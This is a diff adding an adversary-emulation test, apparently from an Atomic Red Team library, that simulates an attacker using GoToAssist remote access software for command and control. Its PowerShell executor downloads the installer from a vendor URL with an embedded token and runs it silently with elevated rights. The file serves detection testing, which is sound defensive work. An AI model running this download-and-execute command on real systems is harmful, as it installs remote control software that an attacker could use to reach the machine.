@@ -55,3 +55,18 @@ atomic_tests:
     name: powershell
     elevation_required: true
 
+- name: GoToAssist Files Detected Test on Windows
+  auto_generated_guid: 1b72b3bd-72f8-4b63-a30b-84e91b9c3578
+  description: |
+    An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"
+      $file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"
+      Start-Process $file1 /S;
+    cleanup_command: 
+      try{$PathToAtomicsFolder/T1219/Bin/GoToCleanup.ps1} catch{}
+    name: powershell
+    elevation_required: true
